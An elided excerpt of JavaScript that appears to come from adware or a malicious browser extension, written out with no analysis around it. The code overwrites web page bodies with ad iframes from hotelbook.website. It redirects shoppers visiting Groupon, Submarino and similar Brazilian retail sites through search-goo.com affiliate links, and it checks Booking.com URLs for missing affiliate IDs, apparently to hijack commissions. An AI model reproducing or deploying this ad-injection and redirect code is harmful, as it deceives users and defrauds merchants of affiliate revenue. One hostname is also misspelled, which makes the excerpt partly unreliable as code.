                    ...
                    if (parent.tagName.toLowerCase() === 'body') {
                   	...
                   	var h = getSizes('h');
						...
						var controlalongitud=0;
							...
							{
								if(window.location.protocol=="https:"){
								parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://hotelbook.website/ads/ads.php?w=' + w + '&h=' + h + '&a=1"></iframe>';
								}
								else
								{
								parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://hotelbook.website/ads/ads.php?w=' + w + '&h=' + h + '"></iframe>';
								}
							}
                        }
                    }
                    ...
                    if (child.tagName.toLowerCase() === 'body') {			
						...
						if (tam(getSizes('t'), true)){
							...
							else
							{
								if(window.location.protocol=="https:")
								{
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://hotebook.website/ads/ads.php?w=' + w + '&h=' + h + '&b=1"></iframe>';
								}
								else
								{
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://hotelbook.website/ads/ads.php?w=' + w + '&h=' + h + '"></iframe>';
								}
							}							
						}
                    }
                ...
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                        ...
                        if (tam(getSizes('t'), true)){
							...
							{
								if(window.location.protocol=="https:"){
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://hotelbook.website/ads/ads.php?w=' + w + '&h=' + h + '&c=1"></iframe>';
								}
								else
								{
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://hotelbook.website/ads/ads.php?w=' + w + '&h=' + h + '"></iframe>';
...
var domains = ['groupon.com.br','centauro.com.br','pontofrio.com.br','tripadvisor.com','tripadvisor.com.br','americanas.com.br','booking.com','aliexpress.com','mercadolivre.com.br','decolar.com','walmart.com.br','submarino.com.br','netshoes.com.br','alibaba.com'];
var valores=['394','395','391','390','390','389','000','377','365','380','387','388','366','379'];
var elvalor='';
...
if (location.href === 'http://www.groupon.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=394";
}
...
if (location.href.indexOf ('www.booking.com')>-1 && location.href.indexOf ('aid=397075')<0 && location.href.indexOf ('aid=813275')<0 && endb>15) {
...
if (location.href.indexOf ('www.booking.com')>-1 && location.href.indexOf ('aid=397075')<0 && location.href.indexOf ('aid=813275')<0 && endb<16) {
	var alerta=location.href;
...
if (location.href === 'http://www.submarino.com.br/') {
	...
	if(getCookie("mlcc")=="empty"){
						...
						createCookie("mlcc", 1, 30);
						window.location ="https://search-goo.com/redirect/type4u.php?superred=390";
					}
}
}
...
if (window.location.hostname=='lelivros.club'>0||window.location.hostname=='lelivros.link'>0){
}
else{
	if (document.location.href.indexOf('meteosite.info')>0||document.location.href.indexOf('compradescuento.com')>0||document.location.href.indexOf('gratismeme.com')>0||document.location.href.indexOf('medicamentosbrasil.org')>0||document.location.href.indexOf('hotelbook.website')>0)
	{
	}
	else{
	a_y();
